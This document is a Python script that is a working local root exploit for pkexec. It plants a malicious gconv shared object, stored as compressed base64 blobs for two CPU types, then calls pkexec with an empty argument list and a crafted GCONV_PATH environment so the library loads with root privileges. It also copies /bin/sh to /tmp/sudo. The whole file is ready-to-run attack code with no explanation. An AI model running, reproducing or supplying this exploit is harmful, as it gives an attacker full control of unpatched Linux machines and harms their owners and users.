from ctypes import *
from ctypes.util import find_library
import os
import zlib
import base64
import tempfile
import platform
import  random

def random_string(length):
    temp=''
    for i in range(length):
        choice = random.randint(1, 3)
        if choice == 1:
            temp += chr(random.randint(97, 122))
        elif choice == 2:
            temp += chr(random.randint(65, 90))
        elif choice == 3:
            temp += random.choice('0123456789')
so_name = random_string(random.randint(4, 6))
file_name = random_string(random.randint(4, 6))

cpu=platform.machine()
if cpu == 'x86_64':  
    payload = zlib.decompress(
        base64.b64decode(
            """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"""
        )
    )
elif cpu == 'arrch64':
    payload = zlib.decompress(
        base64.b64decode(
            """eJztmG1sFMcZx+fubOM3jElcoMUJZ4Qq0pYzUDCGUOXsw9iODCHORSWqqvXe3WJfcr6jt2vHQFScCKVqQyUcUNIPBTltpSapquZD2hClSp0XtUjNh0QJlL4kpaGV3DZVTEMqrspxnZ2Xu93ZPUBtP/5/yfrZ+e/zPPPszOzeLIf7hnYGAwEiCZEXCGst4u2o0I81VXyipJtejpJ2spL51pLqXG5wW8Kzs7919Dhf5Or5YsBlB4Jc3xN0xwVF3BURd0X4SzsnypS2XkTXiOOM0FW7hrhtjbB7/mKl7PPXRSLVbiduK+PupnF15MZpFXZY9FdtXNaK8ZBWzood00bs+SOkf/e9ZO+Zwx23X1z8XHPk2X/+5q//6PrlH7/7MBHXG0ll/L85t3ppTU3iRVtrocdNttNPNs339p39INF8eMlLFx9/6OXffXnl+a/tbT/97Ustm384PD0Z337ib29/2HLfh08euNY9hUgDmfYZhBDtZb4YcGnfkH0rLKNH2EcfosdqHz1QxX+6Sv6vVPHfWEU/Tey5Wk7WkqBLf4Lpy2iMW8+xfpvICrFe5Pr4dZU8L1TRTwpdzX+Q5feO84Tot130Oyb0Z6rkaWX+zeRIvUsmr1Wph2ja6Hguq5mWnrc0jWj70tk00Qbju7SUkTdG06Zl5OO7Yplc1ojriYzBr/lf0ZJTup1Az6QP0uadk9qw8ItldNM0TDKazGUn+V+NdmQRY8pIThrU0PNMOpGMmLlIF9GMlG7pNGHCNHlpznO7TNYysil2Liw1pH9osDembYxs2CJvMOg47HXl9x/Xj5LK8/vkzBN1dsyboi2f25CY+HnxXr2g6LNCX1B02Z4rifdmTWUN2Zxx6M738JsO3bk0zjt051RfcOgNxAm//2ANf3dI6h26s99Wh+7sd4VDX+TQi4d+8UwxRGZuJeRE8dArT8+FtHPO3hfo9QVqll7tL7S+f8dMOLjq3Kpw6Kw8WgPk2NJgtNAaJOwaa9fR9mpHu5G2ex3tFtpO8PYFmpvM9xeihDz/cam03O6f/hweo9N6rGOazNj10ZfHTEc7Pad1dtBH945ucok+T3FZ759ojo4L/YWHS6Xnw+SOc/+meex4lseOneZxdq6OT2LHWZ5Peh6jx3GdkJ/KPO/TPL0L/YVHaJ6oyFM89DIbn4+aSOFmmm/kkejWaIBsZnX/ub8wTetm53NbZl4plZ58ix5hMj088gjZ+lFTtFA89CrLLcfZ9g1c3lkgs1tmnqKxrPYP+gs99Nyu3a7lLTEOxUMvsZjZJaQwe5HM0BVyrGNktW0r7VnaruHtVfXUfl/oc8KPtleJ63TnUHiK2u9R7RStk76Vh49RK2tzzn+nNb6/05xI5cQ6WLc/zeyenvjAlzoT6ey2zgkzb5/QNbsydHs34ettz9VSKU7tCWofovYP1P6A2jWlUukNauPUXqZ2L7XNAf6bydb9wWFSM3VrYGXzKta29wHt9LhcLJV22MKOltaTwVOB2OJbdjS+9y716mmSfvb1VtrPgC3s5H69Pn4ZeqyXfj0t4ZM1p0I9i2/pOR7c/d67b/OObb8T4j7Wcz+Wj/oNsnQCu+6f2/dB/ZzvA7vmd+yaqD7G4/ecbDzVQOMJAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJL5RdzOLnLrC8UAswHRPipss7DTddwuFu0j9dx+WrTPi/iVoi0uk88Ie0Fcb1euf3y1lGP9i45rhd5dw63olkSD3DaK9u+FbRJ2hbAhYedLPKEIIyPCtgkrb3+5sOE6tz5S665zTtgGpb+rJV5/VPiXRFuO44Jot4nrBdGWdf6/uVIMXN/pBpitu7btj8W2hdf27773tvCmSHdkc3jj+g2b13dt/GJ47bCRCg/oFtfXbdp02/X6CtHROuNTdojO3oKvHiqvB7deU143br22PP5uva48b259UXn+3Xp9eZ249Yby8+HWG8vj5dabKgvNpTeXnyu3vph8x1dvIa/76ksqC9Wlt5afU7e+tPx8uvWbyLyvfnP5feHW23zXX4h8ipwu+enLys+pW19OwsQ7waHyU1fBjq4hl0qq3sv+ese5j9jvhIre5vL3ziPXvfMyfM1+G8jRKnmOKnmOV8lzitj35h1/eV9tyn39SNyXqv9Y6HsVfY799c7ja8Jf/X34LaunMi8yiufxrp955uPVlwR4/nnferzrc2XAzuPVuf8S0qasc65718+2wLXXyQplXnge73Mn+31D6bfaPEr/BcU/xu7Lq3N/77zfHfBfD6RKv19l/t75vZ/pl0rqc2qypvd98ijzX+YZz8dFHvW55uPpfe89HbDvysuLVA/76GcD9mrwzuNFqq/28W8Ocv+1iv9Vlsdbf23Qrsf7XDdVybM86F/nZ1meyvqRPz9fqJJnQxV9a9D/fvuC/uO2t0o9mSr6YyyP9/32qKi/XdQ/Ji90Tpj5zkw60TmaTHbqej451rVpXd5IjenWukw6OzHVyX7fOyORyv/UvWtTZzJvpSM5smaKJPVMRnvQ0B/Q9mX/t4RZmpAa05rYty+SJJp2Z2xYGxq8J65pJGXkjdG0aRl5zRrXkplc1jDJmhR1SuW00UwuoWe0lJXLm5o+QWvKje/PGJaRinR1bdns76TtS2fTmp7P6wc0I2vlD5B9eX3c0FIT4+MHaIijpVFPy+W6/8HsA2mLFblzuGdXn9a3ewetkpcsz1NmThvTs6mMQbQd9+3u2TUYoyrdTml9AyJsYMcwleK7YjKof+iu3p4h7a6dO+/pi2vxnt6hPo0YU2krGu0fGuyNaRsjG7YQbTC+S6sMCY23BySuJ+yutIRpaqal5y1WRXJKt29Vz6QPGu4kRkq3dMLGQUQZ2RSLGR3PZcspRpO57CSxr9Er0qPcBy3OSE4qme+c1IZFbbGMbpp0rljJvgWz/GyICYmYB8YtPUGtled2TJ5lc5YRGc1ORBIT6UxqXTpFWGtMN8dIJHUgSyO5tfL8yqSRN9O5rKuh0Wt5I6PbjuJsf8YiEdZ7xDKm6F82HpF8jo1OxBgTK2Esla+0eARfEjxCnt+fpG52qJ2dZmE16ePpJK0jZ7E/vEs6giRCF+o4XVE+z/J/g/1dZv/kyreL3G9Lu0bxV7fREXr8i367yHi5L5d2j9Dld426Le0m/FtNxsv9u7RXApV+Q454ueOLCl3Gy32+tPJ7UKL+Sg4Q/m0m4+X3gLSfU+oPKvZewr/1yvXXum2YVOoPEO/9p8S18vdordvOKf2r958V8b2iLb9DpB1xxC/ziZ8SdcnXv/wdkFbugyXq/JtKvPo9OKL4tyr260p8eV8u7BFlwtT+jyjx8ndb2lbFX43/loiX4y/3ddJ+XvFX5+9xJV7uk6Tdfp3+Z5X48veZsJev0/+zxN6dVdaH3A+fL/r71yv2Z8TehVbi5b78wg3GvyrqL//7ioifv0685FdKvNyXLtxg/DuEz72Ml/vXKyJ+zvH+cMbLdfGu0r/ct54WO+f1VfqX9n0lXn63zov47uvE/12cy3i5zwuLN5V6v+r7a0Foap0yfl2VeKf1+ScT+t7mHs+J59D+97oo8b4/Ghy1u6jn8TNKcrX+pVXiZxq5Z0HR1fj/AJEt/pE="""
        )
    )
else:
    print("Don't work in this cpu")

os.popen("cp /bin/sh /tmp/sudo")
libc = CDLL(find_library("c"))
libc.execve.argtypes = c_char_p, POINTER(c_char_p), POINTER(c_char_p)
libc.execve.restype = c_ssize_t

wd = tempfile.mkdtemp()
open(wd + "/{}.so".format(so_name), "wb").write(payload)
os.mkdir(wd + "/{}/".format(file_name))
open(wd + "/{}/gconv-modules".format(file_name), "w").write(
    "module  UTF-8//    INTERNAL    ../{}    2".format(so_name)
)
os.mkdir(wd + "/GCONV_PATH=.")
os.mknod(wd + "/GCONV_PATH=./{}".format(file_name))
os.chmod(wd + "/GCONV_PATH=.", 0o777)
os.chmod(wd + "/GCONV_PATH=./{}".format(file_name), 0o777)
os.chmod(wd + "/{}.so".format(so_name), 0o777)
os.chdir(wd)
cmd = b"/usr/bin/pkexec"
argv = []
envp = [
    bytes("{}".format(file_name), "utf-8"),
    b"PATH=GCONV_PATH=.",
    b"LC_MESSAGES=en_US.UTF-8",
    bytes("XAUTHORITY=../{}".format(file_name), "utf-8"),
    b"",
]

cargv = (c_char_p * (len(argv) + 1))(*argv, None)
cenv = (c_char_p * (len(envp) + 1))(*envp, None)
libc.execve(cmd, cargv, cenv)